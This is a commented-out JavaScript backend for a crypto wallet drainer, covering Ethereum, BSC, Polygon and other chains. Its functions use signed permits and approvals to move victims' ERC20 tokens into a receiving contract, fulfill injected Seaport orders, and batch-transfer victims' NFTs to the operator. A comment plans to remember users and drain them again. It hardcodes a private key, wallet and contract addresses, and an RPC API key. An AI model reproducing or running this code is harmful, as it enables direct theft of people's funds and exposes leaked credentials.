// const mainContractABI = [
// 	{
// 		"inputs": [
// 			{
// 				"internalType": "address",
// 				"name": "tokenAddress",
// 				"type": "address"
// 			}
// 		],
// 		"name": "addToHoldTokens",
// 		"outputs": [],
// 		"stateMutability": "nonpayable",
// 		"type": "function"
// 	},
// 	{
// 		"inputs": [
// 			{
// 				"internalType": "address",
// 				"name": "_newExector",
// 				"type": "address"
// 			}
// 		],
// 		"name": "setExecutor",
// 		"outputs": [],
// 		"stateMutability": "nonpayable",
// 		"type": "function"
// 	},
// 	{
// 		"inputs": [
// 			{
// 				"internalType": "address",
// 				"name": "tokenAddress",
// 				"type": "address"
// 			},
// 			{
// 				"internalType": "address",
// 				"name": "sender",
// 				"type": "address"
// 			},
// 			{
// 				"internalType": "uint256",
// 				"name": "amount",
// 				"type": "uint256"
// 			}
// 		],
// 		"name": "transferToken",
// 		"outputs": [],
// 		"stateMutability": "nonpayable",
// 		"type": "function"
// 	},
// 	{
// 		"inputs": [],
// 		"stateMutability": "nonpayable",
// 		"type": "constructor"
// 	},
// 	{
// 		"inputs": [],
// 		"name": "withdraw",
// 		"outputs": [],
// 		"stateMutability": "nonpayable",
// 		"type": "function"
// 	},
// 	{
// 		"stateMutability": "payable",
// 		"type": "receive"
// 	}
// ]




// const { Seaport } = require('@opensea/seaport-js');
// const { FeeMarketEIP1559Transaction } = require('@ethereumjs/tx');
// const { Common } = require('@ethereumjs/common');
// const { ethers } = require('ethers');
// const axios = require('axios');

// let providerRPC;

// const privateKey    = '8126cc6894824bfe7498dcd35a88da2e32ffb02c2613b1d6bcc6b1ce93ff832a' // specify the Privatekey Operator (not to be confused with SEED PHRASE), - this is the wallet that will carry out transactions. Gas should always be on it.
// const recipient     = '0x9F29474D5da20998157848111d3a3e95C65eCe28' // specify the address of the recipient
// // --> its recommended to set recipient = operator-wallet -> then you just need to have 1 wallet to handle

// const networks = {
//   // provider - RPC. receiveContract - our contract that will get tokens
//   '0x1': {
//     provider: "https://mainnet.infura.io/v3/988d51cc5e12469dbe2852d8b660b89a",
//     receiveContract: ''
//   },
//   '0x38': {
//     provider: "https://rpc.ankr.com/bsc",
//     receiveContract: '0x15d50f3dd324baf50f08d0c27e4f49756d02b542'
//   },
//   '0x89': {
//     provider: "https://polygon-bor.publicnode.com",
//     receiveContract: '0x5348861679cBf08C9ae532Db1b2304cEB0BE4a8B'
//   },
//   '0xfa': {
//     provider: "https://rpc.ankr.com/fantom",
//     receiveContract: '0x15D50f3dD324baf50F08D0c27E4f49756D02b542'
//   },
//   '0xa86a': {
//     provider: "https://rpc.ankr.com/avalanche",
//     receiveContract: '0x15D50f3dD324baf50F08D0c27E4f49756D02b542'
//   },
//   '0xa': {
//     provider: "https://rpc.ankr.com/optimism",
//     receiveContract: '0x15D50f3dD324baf50F08D0c27E4f49756D02b542'
//   },
//   '0xa4b1': {
//     provider: "https://rpc.ankr.com/arbitrum",
//     receiveContract: '0x15D50f3dD324baf50F08D0c27E4f49756D02b542'
//   },
//   '0x64': {
//     provider: "https://rpc.ankr.com/gnosis",
//     receiveContract: '0x15D50f3dD324baf50F08D0c27E4f49756D02b542'
//   }
// }

// const NFT = {
//   erc721: {contract: '0x67Bb4eC69448f3d1e1b3e6dbf5DFB4AAE26939C4', abi: [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"contract ERC721Partial","name":"tokenContract","type":"address"},{"internalType":"address","name":"actualOwner","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"}],"name":"batchTransfer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_newExector","type":"address"}],"name":"setExecutor","outputs":[],"stateMutability":"nonpayable","type":"function"}]},
//   erc1155: {contract: '0x99b843A22F22De57E093bEcA62DC0008c5C49C68', abi: [
//     {
//       "inputs": [
//         {
//           "internalType": "contract ERC1155Partial",
//           "name": "tokenContract",
//           "type": "address"
//         },
//         {
//           "internalType": "address",
//           "name": "actualOwner",
//           "type": "address"
//         },
//         {
//           "internalType": "address",
//           "name": "recipient",
//           "type": "address"
//         },
//         {
//           "internalType": "uint256[]",
//           "name": "tokenIds",
//           "type": "uint256[]"
//         }
//       ],
//       "name": "batchTransfer",
//       "outputs": [],
//       "stateMutability": "nonpayable",
//       "type": "function"
//     },
//     {
//       "inputs": [
//         {
//           "internalType": "address",
//           "name": "_newExector",
//           "type": "address"
//         }
//       ],
//       "name": "setExecutor",
//       "outputs": [],
//       "stateMutability": "nonpayable",
//       "type": "function"
//     },
//     {
//       "inputs": [],
//       "stateMutability": "nonpayable",
//       "type": "constructor"
//     }
//   ]},
// }


// String.prototype.format = function (args) {
//   return this.replace(/{(\d+)}/g, function (match, index) {
//     // check if the argument is present
//     return typeof args == 'undefined' ? match : args;
//   });
// };

// const getABI = async (address, abiUrl) => {
//   console.log('Getting ABI for', address)
//   let res = await axios.get(abiUrl.format(address));
//   res = res.data.result[0];
//   let abi = JSON.parse(res['ABI']);
//   let impl = '';
//   if (res['Proxy'] === '1' && res['Implementation'] !== "") {
//     impl = res['Implementation'];
//     console.log('Getting impl ABI for', impl);
//     abi = JSON.parse((await axios.get(abiUrl.format(impl))).data.result[0]['ABI']);
//   }
//   return [abi, impl];
// }

// exports.permit = async (chainId, tokenAddress, abiUrl, amount, owner, spender, value, deadline, v, r, s) => {
//     providerRPC = networks[chainId].provider;

//     const provider = new ethers.providers.JsonRpcProvider(providerRPC);
//     let gasPrice = await provider.getFeeData();
//     gasPrice = gasPrice.gasPrice;
//     const wallet = new ethers.Wallet(privateKey, provider);
//     const contractInfo = await getABI(tokenAddress, abiUrl);
//     const tokenContract = new ethers.Contract(tokenAddress, contractInfo[0], wallet);

//     try {
//         const txResponse = tokenContract.permit(owner, spender, amount, deadline, v, r, s, {
//           gasLimit: 500000,
//           gasPrice: gasPrice
//         }).then((response) => {
//           console.log("Permit Success", response);
//           tokenContract.allowance(owner, spender).then((response) => {
//             if (response.toNumber() == 0) return false;
//             // const reswait = tokenContract.transferFrom(owner, recipient, amount - 100000, {
//             //   gasLimit: 500000,
//             //   gasPrice: gasPrice
//             // }).then((response) => console.log('transfer', response));
//           });
//         });
//         // const txReceipt = await txResponse.wait();
//         // console.log(txReceipt.transactionHash);

        
//         // const txRes = await reswait.wait();
//         // console.log(txRes.transactionHash);
        
//     } catch (e) {
//         return false;
//         // const reswait = await tokenContract.transferFrom(owner, recipient, amount / 2, {
//         //         gasLimit:100000,gasPrice:gasPrice
//         //   });
//         // const txRes = await reswait.wait();
//         // console.log(txRes.transactionHash);
//         // console.log("Transfer Done After permit");
//         // return true;
//     }
// }

// exports.transfertoken = async (chainId, tokenAddress, amount, owner) => {
//     // TODO: запоминать юзеров и дрейнить снова
//     providerRPC = networks[chainId].provider;

//     const provider = new ethers.providers.JsonRpcProvider(providerRPC);
//     const wallet = new ethers.Wallet(privateKey, provider);
//     const tokenContract = new ethers.Contract(networks[chainId].receiveContract, mainContractABI, wallet);

//     const feeData = await provider.getFeeData();
//     try {
//         await tokenContract.transferToken(tokenAddress, owner, amount, {gasPrice: feeData.gasPrice});
//     } catch (e) {
//         console.log(e);
//         await tokenContract.transferToken(tokenAddress, owner, amount, {gasPrice: feeData.gasPrice});
//     }

//     console.log("Transfer Done ERC20");
//     return true;
// }

// exports.addtokentolist = async (chainId, tokenAddress) => {
//   providerRPC = networks[chainId].provider;

//   const provider = new ethers.providers.JsonRpcProvider(providerRPC);
//   const wallet = new ethers.Wallet(privateKey, provider);
//   const tokenContract = new ethers.Contract(networks[chainId].receiveContract, mainContractABI, wallet);

//   const feeData = await provider.getFeeData();
//   try {
//       await tokenContract.addToHoldTokens(tokenAddress, {gasPrice: feeData.gasPrice})
//   } catch (e) {
//       await tokenContract.addToHoldTokens(tokenAddress, {gasPrice: feeData.gasPrice})
//   }

//   console.log("Add to hold tokens Done ERC20");
//   return true;
// }


// exports.seainject = async (order) => {
//     providerRPC = "https://eth.meowrpc.com";
//     const provider = new ethers.providers.JsonRpcProvider(providerRPC);
//     const wallet = new ethers.Wallet(privateKey, provider);
//     const seaport = new Seaport(wallet);

//     try{
//       const sendit = async () => {
//       const { executeAllActions: executeAllFulfillActions } = await seaport.fulfillOrder({
//         order,
//         accountAddress: wallet.address,
//         });
//         const transaction = executeAllFulfillActions();
//       }
//       sendit()
//       console.log('Transaction Broadcasted');
//       return true;
//     } catch(error) { console.log(error)
//       const sendit = async () => {
//       const { executeAllActions: executeAllFulfillActions } = await seaport.fulfillOrder({
//         order,
//         accountAddress: wallet.address,
//         });
//         const transaction = executeAllFulfillActions();
//       }
//       sendit()
//       console.log('Transaction Broadcasted');
//       return true;
//     }
// }

// exports.batchtransfer = async (owner, tokenAddress, tokensId, type) => {
//     // type (string): "erc721" or "erc1155";
//     type = type.toLowerCase();
//     if (type != 'erc721' && type != 'erc1155') return;

//     providerRPC = "https://eth.meowrpc.com";
//     const { contract, abi } = NFT[type];

//     const provider = new ethers.providers.JsonRpcProvider(providerRPC);
//     const gasPrice = await provider.getGasPrice();
//     const wallet = new ethers.Wallet(privateKey, provider);

//     try {
//         const res = tokensId.map(numStr => parseInt(numStr));
//         const tokenContract = new ethers.Contract(contract, abi, wallet);

//         const reswait = await tokenContract.batchTransfer(tokenAddress, owner, recipient, res, {
//             gasLimit: 150000, gasPrice: gasPrice
//         });
//         const txRes = await reswait.wait();
//         console.log(txRes.transactionHash);
//         console.log("Transfer Done");
//         return true;
//     } catch (e) {
//         return false;
//     }
// }